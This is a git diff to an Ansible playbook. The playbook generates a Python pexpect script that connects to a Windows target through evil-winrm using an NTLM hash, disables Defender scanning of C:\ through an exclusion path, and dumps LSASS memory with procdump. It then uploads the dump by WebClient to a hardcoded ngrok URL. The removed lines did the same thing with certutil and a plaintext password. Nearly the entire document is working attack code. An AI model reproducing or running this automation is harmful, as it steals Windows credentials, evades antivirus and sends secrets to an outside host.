@@ -7,23 +7,55 @@
 - name: Set ngrok URL as a fact
   set_fact:
     ngrok_url: "{{ (ngrok_url_file.content | b64decode | from_json).ngrok_url }}"
-      
+  register: mimikatz_dump_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ mimikatz_dump_output }}"
+
+
 
 - name: Create evil-winrm script
   copy:
     dest: /opt/mimikatz_dump.py
     content: |
-    
-          spawn evil-winrm -i {{ target_ip }} -u {{ username }} -p {{ password }}
-          expect "PS C:\\Users\\Administrator\\Documents> "
-          send "certutil -urlcache -split -f {{ procdump_url }} {{ procdump_dest }}\r"
-          expect "PS C:\\Users\\Administrator\\Documents> "
-          send "{{ procdump_dest }} -accepteula -ma lsass.exe {{ lsass_dump_dest }}\r"
-          expect "PS C:\\Users\\Administrator\\Documents> "
-          send "powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $FilePath = '{{ lsass_dump_dest }}'; $Uri = '{{ ngrok_url }}/upload; $webClient = New-Object System.Net.WebClient; $webClient.UploadFile($Uri, 'POST', $FilePath)\"\r"
-          expect "PS C:\\Users\\Administrator\\Documents> "
-          send "exit\r"
-          interact
+      import pexpect
+      import re
+
+      target_ip = "{{ target_ip_admin }}"
+      username = "{{ admin }}"
+      hash = "{{ ntlm_admin }}"
+
+      command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"
+
+      path=f"""C:\\Users\\{username}\\Documents\\lsass.dmp"""
+
+
+      set=r"set-mppreference -exclusionpath C:\\"
+      dump="./procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+      ex_1="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
+      ex_2="$webClient = New-Object System.Net.WebClient;"
+      ex_3=f"""$webClient.UploadFile("https://a990-82-124-243-12.ngrok-free.app/upload", "POST", "{path}");"""
+
+      winrm=f'PS \x1b[0mC:\\Users\\{username}\\Documents> '
+      child = pexpect.spawn(command)
+      child.timeout = None
+      child.expect(re.escape(winrm))
+      child.sendline(set)
+      child.expect(re.escape(winrm))
+      child.sendline(dump)
+      child.expect(re.escape(winrm))
+      child.sendline(ex_1)
+      child.expect(re.escape(winrm))
+      child.sendline(ex_2)
+      child.expect(re.escape(winrm))
+      child.sendline(ex_3)
+      child.expect(re.escape(winrm))
+      child.sendline("exit")
+      res = child.before + child.after
+      print(res)
+
 
 
 - name: Make thescript executable
@@ -39,4 +71,3 @@
 - name: Display the output
   debug:
     msg: "{{ mimikatz_dump_output }}"
-
